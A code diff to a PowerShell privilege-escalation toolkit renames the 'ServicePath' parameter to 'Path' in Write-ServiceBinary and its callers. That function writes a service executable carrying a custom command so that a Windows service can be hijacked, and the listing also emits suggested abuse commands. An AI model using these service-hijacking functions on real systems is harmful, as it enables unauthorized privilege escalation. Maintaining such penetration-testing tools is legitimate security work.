@@ -1458,7 +1458,7 @@ function Get-ServiceUnquoted {
                 $Out | Add-Member Noteproperty 'Path' $Service.pathname
                 $Out | Add-Member Noteproperty 'ModifiablePath' $_
                 $Out | Add-Member Noteproperty 'StartName' $Service.startname
-                $Out | Add-Member Noteproperty 'AbuseFunction' "Write-ServiceBinary -Name '$($Service.name)' -ServicePath <HijackPath>"
+                $Out | Add-Member Noteproperty 'AbuseFunction' "Write-ServiceBinary -Name '$($Service.name)' -Path <HijackPath>"
                 $Out | Add-Member Noteproperty 'CanRestart' $CanRestart
                 $Out
             }
@@ -1896,7 +1896,7 @@ function Write-ServiceBinary {
 
         Custom command to execute instead of user creation.
 
-    .PARAMETER ServicePath
+    .PARAMETER Path
 
         Path to write the binary out to, defaults to 'service.exe' in the local directory.
 
@@ -1960,7 +1960,7 @@ function Write-ServiceBinary {
         $Command,
 
         [String]
-        $ServicePath = "$(Convert-Path .)\service.exe"
+        $Path = "$(Convert-Path .)\service.exe"
     )
 
     BEGIN {
@@ -2011,11 +2011,11 @@ function Write-ServiceBinary {
             $Binary[$i+2535] = $CommandBytes[$i]
         }
 
-        Set-Content -Value $Binary -Encoding Byte -Path $ServicePath -Force -ErrorAction Stop
+        Set-Content -Value $Binary -Encoding Byte -Path $Path -Force -ErrorAction Stop
 
         $Out = New-Object PSObject
         $Out | Add-Member Noteproperty 'ServiceName' $TargetService.Name
-        $Out | Add-Member Noteproperty 'ServicePath' $ServicePath
+        $Out | Add-Member Noteproperty 'Path' $Path
         $Out | Add-Member Noteproperty 'Command' $ServiceCommand
         $Out
     }
@@ -2176,7 +2176,7 @@ function Install-ServiceBinary {
             Write-Warning "Error backing up '$ServicePath' : $_"
         }
 
-        $Result = Write-ServiceBinary -Name $ServiceDetails.Name -Command $ServiceCommand -ServicePath $ServicePath
+        $Result = Write-ServiceBinary -Name $ServiceDetails.Name -Command $ServiceCommand -Path $ServicePath
         $Result | Add-Member Noteproperty 'BackupPath' $BackupPath
         $Result
     }
